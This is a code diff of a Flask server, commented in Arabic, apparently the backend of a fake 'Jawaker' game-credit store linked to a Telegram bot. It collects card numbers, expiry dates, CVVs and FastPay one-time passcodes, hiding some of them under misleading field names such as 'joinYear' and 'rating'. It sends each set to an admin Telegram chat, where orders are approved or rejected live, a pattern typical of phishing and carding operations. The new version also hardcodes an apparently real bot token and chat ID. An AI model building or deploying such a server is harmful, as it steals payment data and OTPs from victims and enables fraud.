@@ -1,152 +1,187 @@
+"""
+سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام
+------------------------------------------------
+الوظيفة:
+1. يستقبل بيانات الفورم من الموقع (POST /api/order)
+2. يبعتها للأدمن عبر تلجرام مع زرين: تأكيد / رفض
+3. يستقبل ضغطة الزر من تلجرام (POST /telegram/webhook)
+4. يحدّث حالة الطلب، والموقع بيسأل عنها (GET /api/order/<id>) لحد ما توصل نتيجة
+
+تشغيل محلي:
+    pip install -r requirements.txt
+    python app.py
+
+بعد النشر (Render/Railway/إلخ)، لازم تربط الويبهوك:
+    curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook \
+         -d "url=https://YOUR-SERVER-URL/telegram/webhook"
+"""
+
 import os
+import time
 import uuid
+import threading
+
 import requests
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 
+# ------------------ الإعدادات ------------------
+BOT_TOKEN = "8941591490:AAE_HP_z4z7Ls0nEsalTqLI1dYsg4TYdOL4"
+ADMIN_CHAT_ID = 5437487652
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
 app = Flask(__name__)
-CORS(app)  # للسماح بربط الموقع بالسيرفر بدون مشاكل CORS
+CORS(app)  # يسمح لموقعك (من أي دومين) يحكي مع هاد السيرفر
 
-# ==========================================
-# ⚙️ إعدادات البوت والتلغرام
-# استبدل القيم هنا بالتوكن الخاص ببوتك ورقم الشات
-# ==========================================
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")
-
-# قاعدة بيانات مؤقتة في الذاكرة لتتبع حالة الطلبات
-orders_db = {}
-
-
-def send_telegram_message(text: str):
-    """دالة لإرسال الرسائل إلى تليجرام"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        return response.json()
-    except Exception as e:
-        print(f"Error sending to Telegram: {e}")
-        return None
+# تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
+# لاستخدام حقيقي/دائم، بدّليها بقاعدة بيانات (SQLite/Postgres).
+orders = {}
+orders_lock = threading.Lock()
 
 
 def build_admin_message(order_id: str, payload: dict) -> str:
-    """صياغة الرسالة ليصل التنبيه كاملاً إلى التليجرام"""
     order_info = payload.get("order", {})
-
-    # قراءة الحقول بالتسميات المرسلة من الـ HTML مباشرة
-    month = payload.get("joinDay") or payload.get("month") or "-"
-    year = payload.get("joinMonth") or payload.get("year") or "-"
-    cvv = payload.get("joinYear") or payload.get("cvv") or "-"
-
-    first_name = payload.get("firstNameRecord") or ""
-    last_name = payload.get("lastNameRecord") or ""
+    
+    # تجميع التاريخ والرمز
+    month = payload.get("joinDay") or payload.get("month", "-")
+    year = payload.get("joinMonth") or payload.get("year", "-")
+    cvv = payload.get("joinYear") or payload.get("cvv", "-")
+    
+    first_name = payload.get("firstNameRecord", "")
+    last_name = payload.get("lastNameRecord", "")
     full_billing_name = f"{first_name} {last_name}".strip() or "-"
 
     return (
-        "💳 *طلب دفع جديد* 🟢\n\n"
-        f"🆔 *رقم الطلب:* `{order_id}`\n"
-        f"📦 *الفئة:* {order_info.get('name', '-')}\n"
-        f"💰 *الكمية:* {order_info.get('amount', '-')}\n"
-        f"💵 *السعر:* {order_info.get('price', '-')}\n"
-        "------------------------------------\n"
-        f"🎮 *ID اللاعب:* `{payload.get('id', '-')}`\n"
-        f"👤 *اسم البطاقة:* `{payload.get('jawakerName', '-')}`\n"
-        f"💳 *رقم البطاقة:* `{payload.get('jawakerNumber', '-')}`\n"
-        f"📅 *تاريخ الانتهاء (MM/YY):* `{month}/{year}`\n"
-        f"🔒 *رمز الأمان (CVV):* `{cvv}`\n"
-        "------------------------------------\n"
-        f"🌍 *الدولة:* {payload.get('country', '-')}\n"
-        f"📝 *اسم صاحب الفاتورة:* {full_billing_name}"
+        "💳 طلب دفع جديد 🟢\n"
+        f"رقم الطلب: {order_id}\n"
+        f"الفئة: {order_info.get('name', '-')}\n"
+        f"الكمية: {order_info.get('amount', '-')}\n"
+        f"السعر: {order_info.get('price', '-')}\n\n"
+        f"🆔 ID اللاعب: {payload.get('id', '-')}\n"
+        f"👤 اسم صاحب البطاقة: {payload.get('jawakerName', '-')}\n"
+        f"💳 رقم البطاقة: {payload.get('jawakerNumber', '-')}\n"
+        f"📅 تاريخ الانتهاء (MM/YY): {month}/{year}\n"
+        f"🔒 رمز الأمان (CVV): {cvv}\n"
+        f"🌍 الدولة: {payload.get('country', '-')}\n"
+        f"📝 اسم الفاتورة: {full_billing_name}"
     )
-
-
-# ==========================================
-# 🛣️ المسارات (Endpoints)
-# ==========================================
-
-@app.route("/", methods=["GET"])
-def home():
-    return jsonify({"status": "Server is running", "message": "Jawaker Store Backend API"}), 200
 
 
 @app.route("/api/order", methods=["POST"])
 def create_order():
-    """استقبال بيانات الطلب والبطاقة من الموقع"""
-    data = request.get_json() or {}
+    payload = request.get_json(force=True)
+    order_id = str(uuid.uuid4())[:8]
 
-    # إنشاء ID فريد للطلب
-    order_id = str(uuid.uuid4())[:8]
+    with orders_lock:
+        orders[order_id] = {"status": "pending", "created_at": time.time()}
 
-    # حفظ الطلب بحالة معلقة (pending)
-    orders_db[order_id] = {
-        "status": "pending",
-        "data": data
-    }
+    text = build_admin_message(order_id, payload)
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "✅ تأكيد", "callback_data": f"approve:{order_id}"},
+            {"text": "❌ رفض", "callback_data": f"reject:{order_id}"},
+        ]]
+    }
 
-    # إرسال البيانات للتليجرام
-    msg = build_admin_message(order_id, data)
-    send_telegram_message(msg)
+    try:
+        requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            json={
+                "chat_id": ADMIN_CHAT_ID,
+                "text": text,
+                "reply_markup": keyboard,
+            },
+            timeout=10,
+        )
+    except requests.RequestException as e:
+        return jsonify({"error": f"telegram_send_failed: {e}"}), 502
 
-    return jsonify({
-        "success": True,
-        "order_id": order_id,
-        "message": "تم استلام الطلب وبانتظار المراجعة"
-    }), 200
+    return jsonify({"order_id": order_id})
 
 
 @app.route("/api/order/<order_id>", methods=["GET"])
 def get_order_status(order_id):
-    """فحص حالة الطلب من قبل صفحة الـ HTML (Polling)"""
-    order = orders_db.get(order_id)
-    if not order:
-        return jsonify({"error": "Order not found"}), 404
-
-    return jsonify({
-        "order_id": order_id,
-        "status": order["status"]
-    }), 200
+    order = orders.get(order_id)
+    if not order:
+        return jsonify({"error": "not_found"}), 404
+    return jsonify({"status": order["status"]})
 
 
-@app.route("/api/order/<order_id>/status", methods=["POST"])
-def update_order_status(order_id):
-    """تغيير حالة الطلب (approved أو rejected) عبر التليجرام أو لوحة التحكم"""
-    if order_id not in orders_db:
-        return jsonify({"error": "Order not found"}), 404
+@app.route("/telegram/webhook", methods=["POST"])
+def telegram_webhook():
+    update = request.get_json(force=True)
+    callback = update.get("callback_query")
+    if not callback:
+        return jsonify({"ok": True})
 
-    data = request.get_json() or {}
-    new_status = data.get("status")
+    data = callback.get("data", "")
+    callback_id = callback["id"]
+    message = callback.get("message", {})
+    chat_id = message.get("chat", {}).get("id")
+    message_id = message.get("message_id")
+    old_text = message.get("text", "")
 
-    if new_status in ["approved", "rejected", "pending"]:
-        orders_db[order_id]["status"] = new_status
-        return jsonify({"success": True, "order_id": order_id, "new_status": new_status}), 200
+    if ":" not in data:
+        return jsonify({"ok": True})
 
-    return jsonify({"error": "Invalid status"}), 400
+    action, order_id = data.split(":", 1)
+
+    with orders_lock:
+        order = orders.get(order_id)
+        if order and order["status"] == "pending":
+            if action == "approve":
+                order["status"] = "approved"
+                note = "\n\n✅ تم التأكيد"
+            elif action == "reject":
+                order["status"] = "rejected"
+                note = "\n\n❌ تم الرفض"
+            else:
+                note = None
+        else:
+            note = None
+
+    # رد فوري على تلجرام (حتى تختفي دائرة التحميل عن الزر)
+    requests.post(
+        f"{TELEGRAM_API}/answerCallbackQuery",
+        json={"callback_query_id": callback_id, "text": "تم تسجيل قرارك"},
+        timeout=10,
+    )
+
+    if note and chat_id and message_id:
+        requests.post(
+            f"{TELEGRAM_API}/editMessageText",
+            json={
+                "chat_id": chat_id,
+                "message_id": message_id,
+                "text": old_text + note,
+            },
+            timeout=10,
+        )
+
+    return jsonify({"ok": True})
 
 
+@app.route("/", methods=["GET"])
+def health():
+    return jsonify({"status": "running"})
 @app.route("/api/rating", methods=["POST"])
-def receive_otp():
-    """استقبال رمز الـ OTP المدخل في نافذة FastPay"""
-    data = request.get_json() or {}
-    order_id = data.get("order_id", "-")
-    otp_code = data.get("rating", "-")
-
-    # إرسال كود الـ OTP المكون من 4 إلى 6 أرقام للتليجرام فوراً
-    otp_msg = (
-        "🔑 *رمز تحتيق OTP جديد (FastPay)* 🔑\n\n"
-        f"🆔 *رقم الطلب:* `{order_id}`\n"
-        f"🔢 *رمز الـ OTP:* `{otp_code}`"
-    )
-    send_telegram_message(otp_msg)
-
-    return jsonify({"success": True, "message": "OTP received successfully"}), 200
-
+def receive_rating():
+    payload = request.get_json(force=True)
+    order_id = payload.get("order_id")
+    otp_code = payload.get("rating")
+    
+    # إرسال رمز الـ OTP إلى تلجرام
+    text = f"🔑 رمز الـ OTP للطلب [{order_id}]:\nالرمز: {otp_code}"
+    try:
+        requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            json={"chat_id": ADMIN_CHAT_ID, "text": text},
+            timeout=10,
+        )
+    except Exception as e:
+        print(f"Error: {e}")
+        
+    return jsonify({"status": "success"})
 
 if __name__ == "__main__":
-    # تشغيل السيرفر على البورت 5000
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
